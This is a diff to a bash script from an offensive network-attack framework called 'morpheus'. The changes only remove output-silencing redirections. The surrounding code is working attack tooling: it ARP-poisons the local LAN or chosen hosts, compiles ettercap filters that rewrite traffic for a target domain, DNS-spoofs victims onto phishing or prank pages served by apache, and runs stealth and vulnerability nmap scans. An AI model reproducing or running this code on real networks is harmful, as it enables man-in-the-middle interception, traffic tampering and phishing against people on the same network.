-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-crypto=$(zenity --title="☠ DOMAIN NAME TO FILTER ☠" --text "example: coin-hive.com\nchose the domain name to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+crypto=$(zenity --title="☠ DOMAIN NAME TO FILTER ☠" --text "example: coin-hive.com\nchose the domain name to filter through morpheus." --entry --width 270)
+fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/cryptocurrency.eft $IPATH/filters/cryptocurrency.rb > /dev/null 2>&1
+  cp $IPATH/filters/cryptocurrency.eft $IPATH/filters/cryptocurrency.rb
   cd $IPATH/filters/
   sed -i "s|CrYpT|$crypto|g" cryptocurrency.eft
   sed -i "s|TaRONE|$fil_one|g" cryptocurrency.eft
@@ -2309,11 +2321,11 @@ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose ta
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft > /dev/null 2>&1
+  mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
-  rm $IPATH/output/cryptocurrency.ef > /dev/null 2>&1
+  rm $IPATH/output/cryptocurrency.ef
 
 
     if [ -e $IPATH/logs/crypto-currency.log ]; then
@@ -2324,8 +2336,8 @@ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose ta
         sed -i "s|\!||g" final.log
         sed -i "s|\+||g" final.log
         sed -i "s|(||g" final.log
-        mv final.log crypto-currency.log > /dev/null 2>&1
-        rm final.log > /dev/null 2>&1
+        mv final.log crypto-currency.log
+        rm final.log
     fi
   cd $IPATH
 
@@ -2352,17 +2364,17 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
 #
 # chose the easter egg to use under mitm+dns_spoof
 #
-EGG=$(zenity --list --title "☠ GOOGLE EASTER EGGS ☠" --text "List of availables google easter eggs:" --radiolist --column "Pick" --column "Option" TRUE "Do a Barrel roll" FALSE "zerg rush" FALSE "blink html" FALSE "google 180" --width 320 --height 230) > /dev/null 2>&1
+EGG=$(zenity --list --title "☠ GOOGLE EASTER EGGS ☠" --text "List of availables google easter eggs:" --radiolist --column "Pick" --column "Option" TRUE "Do a Barrel roll" FALSE "zerg rush" FALSE "blink html" FALSE "google 180" --width 320 --height 230)
 #
 # parse easter egg search string
 #
@@ -2382,32 +2394,32 @@ fi
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
-  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/EasterEgg.eft $IPATH/filters/EasterEgg.rb > /dev/null 2>&1 # backup
-  cp $IPATH/bin/phishing/EasterEgg.html $IPATH/bin/phishing/EasterEgg.bak > /dev/null 2>&1 # backup
+  cp $IPATH/bin/etter.dns etter.rb # backup
+  cp $Edns /tmp/etter.dns # backup
+  cp $IPATH/filters/EasterEgg.eft $IPATH/filters/EasterEgg.rb # backup
+  cp $IPATH/bin/phishing/EasterEgg.html $IPATH/bin/phishing/EasterEgg.bak # backup
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
-  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  sed -i "s|PrE|$PrEfI|g" etter.dns
+  cp $IPATH/bin/etter.dns $Edns
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
 
     # using SED bash command to config redirect.eft
     if [ "$EGG" = "google 180" ]; then
-      sed -i "s|IpAdR|$parsed|g" $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
+      sed -i "s|IpAdR|$parsed|g" $IPATH/filters/EasterEgg.eft
     else
-      sed -i "s|IpAdR|https://www.google.im/search?q=$parsed&gws_rd=ssl|g" $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
+      sed -i "s|IpAdR|https://www.google.im/search?q=$parsed&gws_rd=ssl|g" $IPATH/filters/EasterEgg.eft
     fi
 
   echo ${BlueF}[☠]${white} google easter egg:${GreenF}$parsed ${Reset};
   # copy files needed to apache2 webroot...
   cd phishing/
   if [ "$EGG" = "google 180" ]; then
-    cp $IPATH/bin/phishing/Google_prank_180/googlelogo_color_272x92dp.png $ApachE/googlelogo_color_272x92dp.png > /dev/null 2>&1
-    cp $IPATH/bin/phishing/Google_prank_180/Google.html $ApachE/index.html > /dev/null 2>&1
+    cp $IPATH/bin/phishing/Google_prank_180/googlelogo_color_272x92dp.png $ApachE/googlelogo_color_272x92dp.png
+    cp $IPATH/bin/phishing/Google_prank_180/Google.html $ApachE/index.html
   else
-    sed -i "s|RePlAcE|$parsed|g" EasterEgg.html > /dev/null 2>&1
-    cp $IPATH/bin/phishing/EasterEgg.html $ApachE/index.html > /dev/null 2>&1
+    sed -i "s|RePlAcE|$parsed|g" EasterEgg.html
+    cp $IPATH/bin/phishing/EasterEgg.html $ApachE/index.html
   fi
 cd $IPATH
 sleep 1
@@ -2418,7 +2430,7 @@ echo ${BlueF}[☠]${white} Compiling EasterEgg.eft${RedF}!${Reset};
 sleep 1
 xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/EasterEgg.eft -o $IPATH/output/EasterEgg.ef && sleep 3"
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       cd $IPATH/logs
@@ -2447,14 +2459,14 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  rm $IPATH/output/EasterEgg.ef > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft > /dev/null 2>&1 # backup
-  mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html > /dev/null 2>&1 # backup
-  rm $ApachE/index.html > /dev/null 2>&1
-  rm $ApachE/googlelogo_color_272x92dp.png > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 270
+  rm $IPATH/output/EasterEgg.ef
+  mv /tmp/etter.dns $Edns
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft # backup
+  mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html # backup
+  rm $ApachE/index.html
+  rm $ApachE/googlelogo_color_272x92dp.png
   cd $IPATH
   sleep 2
 
@@ -2482,7 +2494,7 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 echo ${BlueF}[☠]${white} checking module dependencies ..${Reset};
 sleep 2
@@ -2589,7 +2601,7 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
   echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
   # grab ip range + scan with nmap + zenity display results
@@ -2599,7 +2611,7 @@ if [ "$?" -eq "0" ]; then
   #
   # agressive scan using nmap -sS -O (OS) pentesting tutorials idea ..
   #
-  Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose the type of scan required\nRemmenber that 'stealth scans' takes longer to complete .." --radiolist --column "Pick" --column "Option" TRUE "Normal" FALSE "Stealth" FALSE "NSE" FALSE "Target" --width 300 --height 250) > /dev/null 2>&1
+  Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose the type of scan required\nRemmenber that 'stealth scans' takes longer to complete .." --radiolist --column "Pick" --column "Option" TRUE "Normal" FALSE "Stealth" FALSE "NSE" FALSE "Target" --width 300 --height 250)
   
 
   #
@@ -2609,32 +2621,32 @@ if [ "$?" -eq "0" ]; then
   dtr=`date | awk {'print $4'}`
   sleep 1
   if [ "$Tc" = "Normal" ]; then
-    nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Normal ].." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Normal ].." --percentage=0 --auto-close --width 300
     # strip results and print report
-    cat $IPATH/logs/lan.mop | grep "for" | awk {'print $3,$5,$6'} | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 480 --height 390 > /dev/null 2>&1
+    cat $IPATH/logs/lan.mop | grep "for" | awk {'print $3,$5,$6'} | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 480 --height 390
 
   elif [ "$Tc" = "Stealth" ]; then
-    nmap -sS $IP_RANGE -O -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Stealth ] .." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    nmap -sS $IP_RANGE -O -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Stealth ] .." --percentage=0 --auto-close --width 300
     # strip results and print report
-    cat $IPATH/logs/lan.mop | grep -v "#" | grep -v "CPE:"| grep -v "type:" | grep -v "Distance:" | grep -v "closed" | grep -v "Too" | grep -v "No" | grep -v "latency" | grep -v "incorrect" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470 > /dev/null 2>&1
+    cat $IPATH/logs/lan.mop | grep -v "#" | grep -v "CPE:"| grep -v "type:" | grep -v "Distance:" | grep -v "closed" | grep -v "Too" | grep -v "No" | grep -v "latency" | grep -v "incorrect" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470
 
   elif [ "$Tc" = "NSE" ]; then
-    nmap -sV -T4 -Pn -oN $IPATH/logs/lan.mop --script vuln $IP_RANGE | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ NSE ] .." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    nmap -sV -T4 -Pn -oN $IPATH/logs/lan.mop --script vuln $IP_RANGE | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ NSE ] .." --percentage=0 --auto-close --width 300
     # strip results and print report
-    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470 > /dev/null 2>&1
+    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470
 
   else
 
-    target=$(zenity --title="☠ Enter  RHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
-    nmap -sS -Pn --reason -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1
+    target=$(zenity --title="☠ Enter  RHOST ☠" --text "example: $IP" --entry --width 270)
+    nmap -sS -Pn --reason -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320
     # strip results and print report
-    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470 > /dev/null 2>&1
+    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470
   fi
 
 
     # cleanup
     echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-    rm $IPATH/logs/lan.mop > /dev/null 2>&1
+    rm $IPATH/logs/lan.mop
     sleep 2
 
 else
@@ -2653,13 +2665,13 @@ sh_exit () {
 echo ${BlueF}[☠]${white} Exit morpheus framework...${Reset};
 sleep 1
 echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.conf ${Reset};
-mv /tmp/etter.conf $Econ > /dev/null 2>&1
+mv /tmp/etter.conf $Econ
 sleep 1
 echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.dns ${Reset};
-mv /tmp/etter.dns $Edns > /dev/null 2>&1
+mv /tmp/etter.dns $Edns
 sleep 1
-mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-rm $ApachE/index.html > /dev/null 2>&1
+mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+rm $ApachE/index.html
 sleep 2
 clear
 echo ${RedF}codename${white}::${RedF}oneiroi_phobetor'(The mithologic dream greek god)'${Reset};
@@ -2670,7 +2682,7 @@ exit
 
 
 sh_main () {
-echo "nothing" > /dev/null 2>&1
+echo "nothing"
 }
 
 
